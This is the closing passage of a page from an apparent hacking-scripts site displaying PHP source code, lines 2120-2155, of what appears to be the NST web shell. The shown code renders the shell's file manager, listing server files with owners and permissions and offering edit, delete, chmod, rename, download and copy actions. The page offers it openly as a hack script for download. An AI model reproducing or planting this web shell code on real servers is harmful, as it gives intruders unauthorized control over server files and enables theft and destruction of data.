<span class="lineno">2120</span> <span class="si">$linkd</span><span class="s2">=&quot;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s1">&#39;$php_self?d=$d/$dirs[$i]&#39;</span><span class="o">&gt;</span><span class="nv">$dirs</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">&lt;/</span><span class="nx">a</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">2121</span> <span class="si">$linkd</span><span class="s2">=str_replace(&quot;</span><span class="c1">//&quot;,&quot;/&quot;,$linkd);</span>
<span class="lineno">2122</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt; </span><span class="si">$linkd</span><span class="s2">&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;center&gt;&lt;font color=blue&gt;DIR&lt;/font&gt;&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&amp;nbsp;&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;center&gt;</span><span class="si">$owner</span><span class="s2">/</span><span class="si">$group</span><span class="s2">&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;</span><span class="si">$info</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2123</span> <span class="p">}</span>
<span class="lineno">2124</span> 
<span class="lineno">2125</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$files</span><span class="p">);</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno">2126</span> 
<span class="lineno">2127</span> <span class="nv">$size</span><span class="o">=@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">2128</span> <span class="nv">$perms</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileperms</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">2129</span> <span class="nv">$owner</span> <span class="o">=</span> <span class="o">@</span><span class="nb">fileowner</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">2130</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="lineno">2131</span> <span class="nv">$fileownera</span><span class="o">=</span><span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$owner</span><span class="p">);</span>
<span class="lineno">2132</span> <span class="nv">$owner</span><span class="o">=</span><span class="nv">$fileownera</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">2133</span> <span class="p">}</span>
<span class="lineno">2134</span> <span class="nv">$group</span> <span class="o">=</span> <span class="o">@</span><span class="nb">filegroup</span><span class="p">(</span><span class="nv">$d</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$files</span><span class="p">[</span><span class="nv">$i</span><span class="p">]);</span>
<span class="lineno">2135</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="lineno">2136</span> <span class="nv">$groupinfo</span> <span class="o">=</span> <span class="nb">posix_getgrgid</span><span class="p">(</span><span class="nv">$group</span><span class="p">);</span>
<span class="lineno">2137</span> <span class="nv">$group</span><span class="o">=</span><span class="nv">$groupinfo</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
<span class="lineno">2138</span> <span class="p">}</span>
<span class="lineno">2139</span> <span class="nv">$info</span><span class="o">=</span><span class="nx">perm</span><span class="p">(</span><span class="nv">$perms</span><span class="p">);</span>
<span class="lineno">2140</span> <span class="k">if</span><span class="p">(</span><span class="nv">$i</span><span class="o">%</span><span class="mi">2</span><span class="p">){</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D1D1D1&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$color</span><span class="o">=</span><span class="s2">&quot;#D7FFA8&quot;</span><span class="p">;}</span>
<span class="lineno">2141</span> 
<span class="lineno">2142</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nv">$size</span><span class="o">.</span><span class="s1">&#39; b&#39;</span><span class="p">;</span>
<span class="lineno">2143</span> <span class="p">}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">2144</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&lt;</span> <span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">((</span><span class="nv">$size</span><span class="o">/</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; kb&#39;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">2145</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&lt;</span> <span class="mi">1000000000</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; mb&#39;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span>
<span class="lineno">2146</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$size</span> <span class="o">&lt;</span> <span class="mi">1000000000000</span><span class="p">){</span><span class="nv">$siz</span><span class="o">=</span><span class="nb">number_format</span><span class="p">(</span><span class="nv">$size</span><span class="o">/</span><span class="p">(</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="o">*</span><span class="mi">1024</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39; gb&#39;</span><span class="p">;}</span>
<span class="lineno">2147</span> <span class="p">}}}</span>
<span class="lineno">2148</span> <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;font face=wingdings size=3&gt;2&lt;/font&gt; &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;e=</span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;</span><span class="si">$files[$i]</span><span class="s2">&lt;/a&gt;&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;center&gt;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">javascript:ShowOrHide(&#39;</span><span class="si">$i</span><span class="s2">&#39;,&#39;&#39;)</span><span class="se">\&quot;</span><span class="s2">&gt;[options]&lt;/a&gt;&lt;div id=&#39;</span><span class="si">$i</span><span class="s2">&#39; style=&#39;display:none;z-index:1;&#39; &gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ef=</span><span class="si">$files[$i]</span><span class="s2">&amp;edit=1&#39; title=&#39;Edit </span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;&lt;b&gt;Edit&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;del_f=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Delete </span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;&lt;b&gt;Delete&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;chmod=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;chmod </span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;&lt;b&gt;CHMOD&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;rename=1&amp;wich_f=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Rename </span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;&lt;b&gt;Rename&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;download=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Download </span><span class="si">$files[$i]</span><span class="s2">&#39;&gt;&lt;b&gt;Download&lt;/b&gt;&lt;/a&gt;&lt;br&gt;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ccopy_to=</span><span class="si">$files[$i]</span><span class="s2">&#39; title=&#39;Copy </span><span class="si">$files[$i]</span><span class="s2"> to?&#39;&gt;&lt;b&gt;Copy&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;</span><span class="si">$siz</span><span class="s2">&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;&lt;center&gt;</span><span class="si">$owner</span><span class="s2">/</span><span class="si">$group</span><span class="s2">&lt;/td&gt;&lt;td bgcolor=</span><span class="si">$color</span><span class="s2">&gt;</span><span class="si">$info</span><span class="s2">&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2149</span> <span class="p">}</span>
<span class="lineno">2150</span> 
<span class="lineno">2151</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno">2152</span> <span class="k">echo</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno">2153</span> 
<span class="lineno">2154</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">2155</span> <span class="x">&lt;!-- Network security team :: nst.void.ru --&gt;</span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="http://upload.hackingscripts.com" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
